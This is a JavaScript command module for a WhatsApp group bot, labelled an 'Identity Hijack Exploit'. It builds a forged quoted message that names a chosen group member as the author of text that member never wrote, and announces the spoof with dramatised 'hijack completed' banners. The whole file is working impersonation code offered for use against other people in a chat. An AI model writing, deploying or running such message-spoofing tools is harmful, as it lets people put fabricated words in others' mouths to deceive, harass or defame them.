const { log } = require('../utils/logger');

module.exports = {
    name: 'hijack',
    description: '🎭 Identity Hijack Exploit: Full identity spoofing in quoted contexts.',
    category: 'admin',
    isAdmin: true,
    isGroupOnly: true,
    async execute({ sock, chatId, message, args }) {
        try {
            // Usage: *hijack @user | Fake Message Text
            const input = args.join(' ');
            const [targetPart, ...textParts] = input.split('|');
            const fakeText = textParts.join('|').trim();

            let targetJid;
            if (message.message?.extendedTextMessage?.contextInfo?.participant) {
                targetJid = message.message.extendedTextMessage.contextInfo.participant;
            } else if (targetPart.includes('@')) {
                targetJid = targetPart.trim().replace('@', '') + '@s.whatsapp.net';
            }

            if (!targetJid || !fakeText) {
                return await sock.sendMessage(chatId, { text: '❌ *Usage:* \n`*hijack @user | Message` \nOu réponds à quelqu\'un avec `*hijack | Message`.' });
            }

            await sock.sendMessage(chatId, { text: '🎭 *INITIATING SOVEREIGN_IDENTITY_ACQUISITION*...\n📡 *PROTOCOL:* Spf-V4 (Spoofing_Engine_Active)' });

            // Payload composition
            const spoofedMsg = {
                key: {
                    remoteJid: chatId,
                    fromMe: false,
                    id: 'SPF_' + Date.now().toString(36).toUpperCase(),
                    participant: targetJid
                },
                message: {
                    conversation: fakeText
                }
            };

            await sock.sendMessage(chatId, {
                text: `💀 *IDENTITY HIJACK COMPLETED* \n________________________________\n> Target: @${targetJid.split('@')[0]}\n> Method: Flux_Interception_v4\n> Status: Sovereign_Control_Established`,
                contextInfo: {
                    quotedMessage: spoofedMsg.message,
                    participant: targetJid,
                    remoteJid: chatId,
                    // Additional "Attack" attributes
                    isForwarded: true,
                    forwardingScore: 5 // Higher score for dominance feel
                },
                mentions: [targetJid]
            });

        } catch (error) {
            log.error('Error in HIJACK command:', error);
            await sock.sendMessage(chatId, { text: '❌ Échec de la simulation de détournement.' });
        }
    }
};
